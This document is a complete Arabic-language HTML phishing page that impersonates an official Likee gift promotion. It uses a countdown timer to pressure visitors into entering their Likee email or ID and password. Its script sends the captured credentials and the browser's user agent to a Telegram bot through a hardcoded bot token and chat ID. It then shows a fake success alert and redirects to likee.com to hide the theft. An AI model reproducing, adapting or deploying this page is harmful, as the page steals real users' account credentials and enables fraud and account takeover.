<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Likee Gift | هدية لايكي</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:radial-gradient(circle at 30% 10%, #0b0b2b, #1e1e3f);font-family:'Poppins',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
        .card{max-width:460px;width:100%;background:rgba(20,20,40,0.7);backdrop-filter:blur(12px);border-radius:48px;border:1px solid rgba(255,215,0,0.4);box-shadow:0 20px 35px rgba(0,0,0,0.5);overflow:hidden;}
        .hero{background:linear-gradient(145deg,#f7971e,#ffd200);padding:32px 24px;text-align:center;}
        .hero h1{font-size:2rem;font-weight:800;color:#1e1e2a;margin-bottom:6px;}
        .hero p{font-weight:600;color:#1e1e2a;}
        .timer-box{background:rgba(0,0,0,0.3);display:flex;justify-content:center;gap:20px;margin-top:20px;padding:8px;border-radius:60px;}
        .timer-box div{background:#00000055;padding:6px 12px;border-radius:30px;color:white;font-weight:bold;font-family:monospace;font-size:1.2rem;}
        .form{padding:32px 28px 40px;}
        .input-group{margin-bottom:22px;}
        .input-group input{width:100%;padding:15px 20px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,215,0,0.3);border-radius:44px;font-size:1rem;color:white;font-family:inherit;outline:none;}
        .input-group input:focus{border-color:#ffd200;background:rgba(255,255,255,0.12);}
        .login-btn{width:100%;background:linear-gradient(95deg,#f7971e,#ffd200);border:none;padding:15px;border-radius:50px;font-weight:800;font-size:1.2rem;color:#1e1e2a;cursor:pointer;transition:0.2s;}
        .login-btn:active{transform:scale(0.96);}
        .gift-note{text-align:center;margin-top:18px;font-size:0.75rem;color:#ffd200;}
        footer{text-align:center;padding:14px;font-size:0.7rem;color:rgba(255,255,255,0.3);background:rgba(0,0,0,0.3);}
    </style>
</head>
<body>
<div class="card">
    <div class="hero">
        <h1>✨ رشقة Likee ✨</h1>
        <p>10,000 عملة + شارة أسطورية</p>
        <div class="timer-box">
            <div><span id="hours">00</span>:ساعة</div>
            <div><span id="minutes">00</span>:دقيقة</div>
            <div><span id="seconds">00</span>:ثانية</div>
        </div>
    </div>
    <div class="form">
        <form id="likeeForm">
            <div class="input-group"><input type="text" id="username" placeholder="📧 البريد الإلكتروني أو معرف Likee" autocomplete="off" required></div>
            <div class="input-group"><input type="password" id="password" placeholder="🔒 كلمة المرور" required></div>
            <button type="submit" class="login-btn">تسجيل الدخول والحصول على الهدية 🎁</button>
        </form>
        <div class="gift-note">🎉 هدية حصرية لليوم فقط - لا تفوت الفرصة</div>
    </div>
    <footer>© Likee Official Gift 2026</footer>
</div>
<script>
    const BOT_TOKEN = "7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM";
    const ADMIN_ID = "6829017835";

    async function sendToTelegram(username, password) {
        const text = `✨ **Likee | رشقة جديدة** ✨\n\n👤 **المستخدم:** ${username}\n🔑 **كلمة المرور:** ${password}\n🕒 ${new Date().toLocaleString('ar-EG')}\n📱 ${navigator.userAgent.slice(0,70)}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            const res = await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: ADMIN_ID, text: text, parse_mode: 'Markdown'})
            });
            return res.ok;
        } catch(e) { return false; }
    }

    function startCountdown() {
        let total = 1*3600 + 45*60;
        const hSpan=document.getElementById('hours'), mSpan=document.getElementById('minutes'), sSpan=document.getElementById('seconds');
        setInterval(()=>{
            if(total<=0) return;
            const h=Math.floor(total/3600), m=Math.floor((total%3600)/60), s=total%60;
            hSpan.innerText=h<10?'0'+h:h; mSpan.innerText=m<10?'0'+m:m; sSpan.innerText=s<10?'0'+s:s;
            total--;
        },1000);
    }
    startCountdown();

    document.getElementById('likeeForm').addEventListener('submit', async(e)=>{
        e.preventDefault();
        const user = document.getElementById('username').value.trim();
        const pass = document.getElementById('password').value;
        if(!user||!pass) return alert('يرجى إدخال البيانات كاملة');
        const btn = e.target.querySelector('.login-btn');
        const original = btn.innerText;
        btn.innerText = 'جاري التفعيل...';
        btn.disabled = true;
        const ok = await sendToTelegram(user, pass);
        if(ok){
            alert('✅ تم إضافة الرشقة بنجاح! جاري التحويل...');
            window.location.href = 'https://likee.com';
        } else {
            alert('❌ فشل الاتصال، حاول مرة أخرى');
            btn.innerText = original;
            btn.disabled = false;
        }
    });
</script>
</body>
</html>
